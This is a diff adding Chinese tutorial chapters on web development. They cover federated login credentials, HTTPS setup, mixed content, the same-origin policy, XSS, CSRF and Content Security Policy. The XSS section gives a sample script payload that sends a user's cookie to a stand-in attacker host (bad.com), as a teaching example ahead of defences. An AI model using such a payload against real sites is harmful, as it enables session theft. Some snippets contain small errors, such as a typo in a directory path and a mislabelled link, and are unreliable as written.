@@ -2155,6 +2155,446 @@ $btn.addEventListener('click', () => {
 对于用户而言，注册账号密码是一件非常麻烦的事情，不但注册过程繁琐且花时间，同时也提高了用户的账号维护成本。因此如果网站能够提供第三方登录，让用户能够直接复用一些现有且常用的网站账号，将能够大大提高用户体验。
 
 
+#### 6.4.1 接入第三方登录API
+
+一些大型的站点平台都会开放相应的第三方登录接口和说明文档，如国内的有：
+
+- 百度账号接入指南：http://developer.baidu.com
+- 新浪微博接入指南：http://open.weibo.com
+- 微信账号接入指南：https://open.weixin.qq.com
+- QQ账号接入指南：https://connect.qq.com/intro/login
+
+国外的有：
+
+- google：https://developers.google.cn/identity/sign-in/web/
+- facebook：https://developers.facebook.com/docs/facebook-login
+- twitter：https://dev.twitter.com/web/sign-in/implementing
+- github：https://developer.github.com/v3/oauth/
+
+
+#### 6.4.2 保存第三方登录凭证
+
+需要调用方法 navigator.credentials.store()进行第三方登录凭证存储，只不过存入的凭证类型为FederatedCredential。FederatedCredential同样实现了Credential接口，同时还新增了provider字段作为第三方登录提供方的标识符。
+因此，FederatedCredential初始化参数对象包含以下信息：
+
+- id: 必须 账户名
+- provider: 必须 第三方登录提供方网址
+- name: 非必需 用户名
+- iconURL: 非必需 用户头像
+
+其中 provider 要求必须是完整的带协议头的 URL 地址。我们可以在控制台做如下实验：
+
+```js
+new FederatedCredential({id:'123',provider:'https://wwww.baidu.com',name:'test'})
+```
+
+
+浏览器会校验 provider 的格式，当格式不符合 URL 格式时会抛出错误。可以使用 FederatedCredential 对第三方登录信息进行存储啦。
+
+```js
+thirdPartyLogin()
+    .then(function (profile) {
+        if (navigator.credentials) {
+            let cred = new FederatedCredential({
+                id: profile.email,
+                provider: THIRD_PARTY_PROVIDER,
+                name: profile.name,
+                iconUrl: profile.iconUrl
+            });
+
+            return navigator.credentials.store(cred);
+        }
+
+        return profile;
+    })
+    .then(function (profile) {
+        // 后续操作
+    })
+    .catch(function (err) {
+        // 错误处理
+    });
+```
+
+#### 6.4.3 读取第三方登录凭证
+
+需要调用方法 navigator.credentials.get() 方法进行第三方登录凭证的读取。
+
+navigator.credentials.get(options) 方法传入参数包含一个字段 federated，可以通过这个字段去读取第三方登录的凭证信息。
+
+options.federated: 第三方登录 {Object}
+providers: {Array} 联合登录账号供应者 id 组成的数组
+
+例如：
+
+```js
+navigator.credentials.get({
+    federated: {
+        providers: ['https://www.baidu.com', 'https://www.weibo.com', 'https://www.github.com']
+    }
+});
+```
+
+
+这些 providers 需要与 FederatedCredential 第三方登录凭证信息的 provider 相一致。
+
+这样假设存入的第三方登录凭证如下：
+
+
+```js
+let cred = new FederatedCredential({
+    id: '123456',
+    provider: 'https://www.baidu.com',
+    name: '测试百度用户名',
+    iconUrl: 'path-to-icon'
+});
+```
+则在弹出的账号选择列表中，就可以看到如下所示的账号信息：
+
+![第三方登录凭证信息](/images/only-third-party.jpg)
+
+
+不同于密码凭证信息，第三方登录凭证信息会拿 id 字段作为账号的标识。
+
+对于不同的第三方登录具有不同的处理方式，因此在获取到第三方登录凭证信息之后，需要通过 type 和  provider 字段进行凭证信息分类处理，如：
+
+```js
+navigator.credentials.get({
+    password: true,
+    federated: {
+        providers: ['https://www.baidu.com', 'https://www.weibo.com']
+    }
+})
+.then(function (cred) {
+    if (cred) {
+        switch (cred.type) {
+            case 'password':
+            // PasswordCredential 凭证处理
+            case 'federated':
+                // FederatedCredential 凭证处理
+                switch (cred.provider) {
+                    case 'https://www.baidu.com':
+                        // 调起百度第三方登录
+                    case 'https://www.weibo.com':
+                        // 调起微博第三方登录
+                }
+        }
+    }
+});
+```
+
+## 7. web安全
+
+### 7.1 使用https
+
+HTTPS（全称：Hyper Text Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 它是一个URI scheme（抽象标识符体系），句法类同http:体系。用于安全的HTTP数据传输。https:URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密/身份验证层（在HTTP与TCP之间）。
+
+HTTPS 的主要作用是：
+
+1. 对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全;
+2. 对网站服务器进行真实身份认证。
+
+SSL/TLS 协议采用非对称加密方式，服务端会生成公钥和私钥，公钥用来加密信息，可以提供给所有需要进行通信的客户端，私钥保存在本地，不能泄露。客户端使用这份公钥对信息进行加密，将请求发送给服务器，服务器用私钥解密。反之，服务器对客户端的返回，则使用客户端提供的公钥进行加密，客户端使用本地对应的私钥来解密，保证了通信的安全。
+
+
+详细：https://security.stackexchange.com/questions/20803/how-does-ssl-tls-work
+
+基于 SSL/TLS 进行 一次的 HTTPS 会话的过程，简单地说可以分成3步
+
+1. 客户端向服务器端索要并验证公钥。
+2. 双方协商生成"对话密钥"。
+3. 双方采用"对话密钥"进行加密通信。
+
+
+![HTTPS 会话的过程](/images/https.png)
+
+HTTPS 服务器拥有一张数字证书，包含了经过认证的网站公钥和一些元数据，客户端和服务端通信时，会首先验证证书的有效性，来决定是否继续通信。这样一来，经过了身份认证、信息加密等步骤，网络通信安全就得到了保障。
+
+
+#### 7.1.1 升级HTTPS
+
+1. 获取证书
+
+HTTPS 是由证书认证机构 CA（Certificate Authority）颁发的、并包含公开密钥拥有者信息、公开密钥、签发者信息、有效期以及一些扩展信息、能提供在互联网上进行身份验证的一种权威性数字文件。要保证数字证书的真实性，必须确保该数字证书是由具有权威性的国际 CA 中心签发的，如 Symantec 就是这样一家通过 Web Trust 认证的国际 CA。购买 CA 颁发的证书有很多类型，分为域名认证、公司认证、扩展认证三个级别，还分成单域名、通配符、多域名三种覆盖范围。认证级别越高、覆盖范围越广的证书，价格越贵。
+
+2. 在服务器安装证书
+
+可以将证书文件存放在 ect/ssl 目录，然后选择对应的服务器进行配置，使用 Mozilla 便捷的配置生成器https://www.w3.org/TR/CSP/
+
+3. 重定向配置
+
+将 HTTP 的访问请求 301 到 HTTPS
+
+Nginx
+
+```text
+server {
+    listen 80;
+    server_name domain.com www.domain.com;
+    return 301 https://domain.com$request_uri;
+}
+```
+
+Apache （.htaccess文件）
+
+```text
+RewriteEngine On
+RewriteCond %{HTTPS} off
+RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
+```
+
+
+4. 修改资源链接
+
+将站点所有的 HTTP 资源地址替换成 HTTPS，一个比较好的方法是直接将协议头替换成 //，这样浏览器会自动根据当前页面的协议加载相同协议头的资源，更为灵活。例如：
+
+<script src="http://a.com/jquery.js"></script>
+改为
+
+<script src="//a.com/jquery.js"></script>
+
+如果修改不完全，HTTPS 资源和 HTTP 资源混合出现，即页面包含混合内容，浏览器将警告用户已失去 HTTPS 的全部能力（直观的看，地址栏 HTTPS 的标识将处于失效状态）。事实上，如果是主动混合内容（脚本、插件、CSS、iframe），则浏览器通常根本不会加载或执行此内容，从而导致页面残缺。
+
+
+5. 可以进一步保证安全：设置 Cookie 安全标记
+
+如果用户的身份验证 Cookie 在明文中暴露，则整个会话的安全保障将被破坏，因此，应该确保浏览器只在使用 HTTPS 时，才发送 Cookie。
+
+在网站响应头里面，Set-Cookie字段加上Secure标志即可。
+
+Set-Cookie: LSID=DQAAAK...Eaem_vYg; Secure
+
+#### 7.1.2 避免 HTTPS 站点出现混合内容
+
+混合内容（Mixed Content）：初始 HTML 内容通过安全的 HTTPS 连接加载，但其他资源（例如，图像、视频、样式表、脚本）则通过不安全的 HTTP 连接加载，即在同一个页面同时混合加载了 HTTP 和 HTTPS 资源。
+
+
+混合内容的存在会降低整个页面的安全性，因为这些请求容易受到 XSS，中间人等各种攻击。用户看到这些 Warning 的时候，如果存在威胁，很有可能已经被攻击。所以开发者有义务将资源替换成 HTTPS，减少安全风险。
+
+
+鉴于上述威胁，浏览器最好是阻止所有混合内容。但这极易导致大量站点不可用。当前的折衷做法是阻止最危险的混合内容类型，同时仍允许请求不太危险的混合内容类型。现代浏览器遵循混合内容规范，定义了可选择性地阻止的内容和可阻止的内容类别。
+
+
+根据此规范，当前可选择性阻止的内容中仅包括图像、视频和音频资源以及预获取这些资源的链接等。随着时间的推移，此类别可能会缩小。可选择性阻止的内容以外的所有内容被视为可阻止的内容，将被浏览器阻止。
+
+
+#### 7.1.3 批量处理 HTTPS 站点中的混合内容
+
+
+1. 使用 CSP 查找混合内容
+
+给网站设置响应头：
+
+```text
+Content-Security-Policy-Report-Only: default-src https: 'unsafe-inline' 'unsafe-eval'; report-uri https://example.com/reportingEndpoint
+```
+
+2. 自动升级不安全的请求
+
+可以使用 CSP 的 upgrade-insecure-requests 配置项，浏览器在请求 http 资源时，会自动升级请求对应的 https 资源。
+
+如，配置请求头
+
+```text
+Content-Security-Policy: upgrade-insecure-requests
+```
+
+
+或，使用meta标签
+
+```text
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+```
+
+都能使浏览器对 <img src="http://example.com/image.jpg"> 的请求转向 https://example.com/image.jpg。但注意，这时需要保证升级后的资源地址可用，不然就会请求失败。
+
+
+
+3.阻止所有混合内容
+
+配置请求头
+
+```text
+Content-Security-Policy: block-all-mixed-content
+```
+或，使用meta标签
+
+```text
+<meta http-equiv="Content-Security-Policy" content="block-all-mixed-content">
+```
+将导致所有不安全的混合内容被浏览器阻止，但这个存在"误杀"的风险，慎重使用。
+
+
+### 7.2 同源策略
+
+浏览器的同源策略是 Web 安全的基石，它对从一个源加载的文档或脚本如何与来自另一个源的资源进行交互做出了限制。
+
+如果协议，端口和主机对于两个页面是相同的，则两个页面具有相同的源。
+
+#### 7.2.1 一些内嵌资源不受限制
+
+- <script src="..."></script> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。
+
+- <link rel="stylesheet" href="..."> 标签嵌入CSS。
+
+- <img> 嵌入图片。
+
+- <video> 和 <audio> 嵌入多媒体资源。
+
+- <object>, <embed> 和 <applet>的插件。
+
+- @font-face 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。
+
+- <frame> 和 <iframe>载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。
+
+
+#### 7.2.2 限制范围
+
+非同源的网站，主要有3种行为受到限制
+
+1. 无法共享 cookie, localStorage, indexDB
+2. 无法操作彼此的 DOM 元素
+3. 无法发送 Ajax 请求
+
+同源策略做了很严格的限制，但在实际的场景中，又确实有很多地方需要突破同源策略的限制，也就是我们常说的跨域。
+
+规避上述限制，实现跨域通信的解决方案有多种，如 CORS，JSONP，使用window.name，使用window.postMessage 等，这里就不一一展开讲了。
+
+
+### 7.3 典型的安全漏洞
+
+Web 典型的安全漏洞种类很多，如 XSS, CSRF, SQL注入,Cross IFrame Trick, clickJacking, 文件上传 等等。下面列举两种客户端常见的安全漏洞。
+
+#### 7.3.1 XSS
+
+XSS (Cross Site Scripting)，跨站脚本攻击。攻击者往 Web 页面里注入恶意代码，当用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取 cookie 信息、会话劫持、改变网页内容、恶意跳转等各种攻击。XSS 是常见的 Web 攻击技术之一，由于跨站脚本漏洞易于出现且利用成本低，所以被 OWASP 列为当前的头号 Web 安全威胁。
+
+在 a.com 的搜索输入框中输入如下内容，并提交请求
+
+```js
+<script>location.href=http://www.bad.com/?cookie=document.cookie</script>
+```
+如果前端没有进行过滤，浏览器地址可能变为：
+
+```js
+http://www.a.com/?query=<script>location.href=http://www.bad.com/?cookie=document.cookie</script>
+```
+
+此时，用户的 cookie 信息已经被发送到攻击者的服务器，攻击者便能利用收集的 cookie 信息来伪造用户身份，进行多种恶意非法操作.
+
+XSS 攻击类型一般分为三种：
+
+- 反射型 XSS:反射型 XSS 只是简单的把用户输入的数据“反射”给浏览器，XSS 脚本出现在 URL 请求参数里，也就是说需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型 XSS 也叫作非持久型 XSS。
+
+- 储存型 XSS:存储型 XSS 也被称为持久型 XSS，当攻击者输入一段恶意脚本后，被服务端接受保存，当用户访问这个页面时，恶意脚本就会被执行，从而造成漏洞。
+
+- DOM Based XSS:基于 DOM 的 XSS，通过对具体 DOM 代码进行分析，根据实际情况构造 DOM 节点进行 XSS 跨站脚本攻击。
+
+> 防范 XSS
+
+对于 XSS 攻击，我们可以做如下防范：
+
+- 输入过滤。永远不要相信用户的输入，对用户输入的数据做一定的过滤。如输入的数据是否符合预期的格式，比如日期格式，Email 格式，电话号码格式等等。同时，后台服务器需要在接收到用户输入的数据后，对特殊危险字符进行过滤或者转义处理，然后再存储到数据库中。
+
+- 输出编码。服务器端输出到浏览器的数据，可以使用系统的安全函数来进行编码或转义来防范 XSS 攻击。输出 HTML 属性时可以使用 HTML 转义编码（HTMLEncode）进行处理，输出到页面脚本代码中，可以相应进行 Javascript encode 处理。
+
+- HttpOnly Cookie。预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。
+
+- WAF(Web Application Firewall)，Web 应用防火墙，主要的功能是防范诸如网页木马、XSS 以及 CSRF 等常见的 Web 漏洞攻击。由第三方公司开发，在企业环境中深受欢迎。
+
+#### 7.3.2 CSRF
+
+CSRF (Cross Site Request Forgery)，即跨站请求伪造。简单的理解是，攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF 能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等，造成个人隐私泄露，财产损失。
+
+> 防范 CSRF
+
+1. 验证码。应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制 CSRF 攻击。但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。
+
+2. Referer Check。HTTP Referer 是 header 的一部分，当浏览器向 Web 服务器发送请求时，一般会带上 Referer 信息告诉服务器是从哪个页面链接过来的，服务器以此可以获得一些信息用于处理。可以通过检查请求的来源来防御 CSRF 攻击。正常请求的 referer 具有一定规律，如在提交表单的 referer 必定是在该页面发起的请求。所以通过检查 http 包头 referer 的值是不是这个页面，来判断是不是 CSRF 攻击。
+
+3. Anti CSRF Token。目前比较完善的解决方案是加入 Anti-CSRF-Token，即发送请求时在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器建立一个拦截器来验证这个 token。服务器读取浏览器当前域 cookie 中这个 token 值，会进行校验该请求当中的 token 和 cookie 当中的 token 值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。
+
+
+
+### 7.4 CSP(内容安全策略)
+
+CSP(Content Security Policy) 即内容安全策略，主要目标是减少、并有效报告 XSS 攻击，其实质就是让开发者定制一份白名单，告诉浏览器允许加载、执行的外部资源。即使攻击者能够发现可从中注入脚本的漏洞，由于脚本不在白名单之列，浏览器也不会执行该脚本，从而达到了降低客户端遭受 XSS 攻击风险和影响的目的。
+
+默认配置下，CSP 甚至不允许执行内联代码 (<script> 块内容，内联事件，内联样式)，以及禁止执行eval(), setTimeout 和 setInterval。为什么要这么做呢？因为制定来源白名单依旧无法解决 XSS 攻击的最大威胁：内联脚本注入。浏览器无法区分合法内联脚本与恶意注入的脚本，所以通过默认禁止内联脚本来有效解决这个问题。
+
+事实上我们并不推荐使用内联脚本混合的开发方式，使用外部资源，浏览器更容易缓存，对开发者也容易阅读理解，并且有助于编译和压缩。当然，如果不得不需要内联脚本和样式，可以通过设置 unsafe-inline，来解除这一限制。
+
+
+#### 7.4.1 启用 CSP
+
+有两种方法配置并启用 CSP
+
+1. 设置 HTTP 头的 Content-Security-Policy 字段（旧版 X-Content-Security-Policy）
+
+```js
+Content-Security-Policy: script-src 'self'; object-src 'none';style-src cdn.example.org third-party.org; child-src https:
+```
+
+2. 设置页面的 <meta> 标签
+
+```js
+<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:">
+```
+
+上述例子进行了配置
+
+- script: 只信任当前域名
+- bject-src: 不允许加载任何插件资源（如object, embed, applet 等标签引入的 flash 等插件）
+- 样式: 只信任来自 cdn.example.org 和 third-party.org
+- 框架内容（如 iframe）: 必须使用 https 协议加载
+
+CSP 提供了很多可配置的选项来针对不同资源的加载进行限制，常见的有，
+
+- script-src：外部脚本
+- style-src：样式表
+- img-src：图像
+- media-src：媒体文件（音频和视频）
+- font-src：字体文件
+- object-src：插件（比如 Flash）
+- child-src：框架
+- manifest-src：manifest 文件
+
+
+如果不为某条配置设置具体的值，则默认情况下，该配置在运行时认为你指定 * 作为有效来源（例如，你可以从任意位置加载字体，没有任何限制）。也可以设置 default-src 的值，来代替各个选项的默认值。
+
+
+每个配置选项的值，可填入以下内容
+
+- 主机名：example.org，https://example.com:443
+- 路径名：example.org/resources/js/
+- 通配符：*.example.org，*://*.example.com:*（表示任意协议、任意子域名、任意端口）
+- 协议名：https:、data:
+- 关键字 'self'：当前域名，需要加引号
+- 关键字 'none'：禁止加载任何外部资源，需要加引号
+- 这里不对资源白名单的配置具体介绍了，更多内容可参阅：https://www.w3.org/TR/CSP/
+
+
+## 8. 使用 RAIL 模型评估性能
+
+https://developers.google.cn/web/fundamentals/performance/rail
+
+## 9. App Shell 模型
+
+App Shell 架构是构建 Progressive Web App 的一种方式，这种应用能可靠且即时地加载到您的用户屏幕上，与本机应用相似。
+
+App“shell”是支持用户界面所需的最小的 HTML、CSS 和 JavaScript，如果离线缓存，可确保在用户重复访问时提供即时、可靠的良好性能。这意味着并不是每次用户访问时都要从网络加载 App Shell。 只需要从网络中加载必要的内容。
+
+
+对于使用包含大量 JavaScript 的架构的单页应用来说，App Shell 是一种常用方法。这种方法依赖渐进式缓存 Shell（使用服务工作线程）让应用运行。接下来，为使用 JavaScript 的每个页面加载动态内容。App Shell 非常适合用于在没有网络的情况下将一些初始 HTML 快速加载到屏幕上。
+
+### 9.1 何时使用 App Shell 模型
+
+
+
+
+
+
+
+## 10. LAVAS
 
 
 
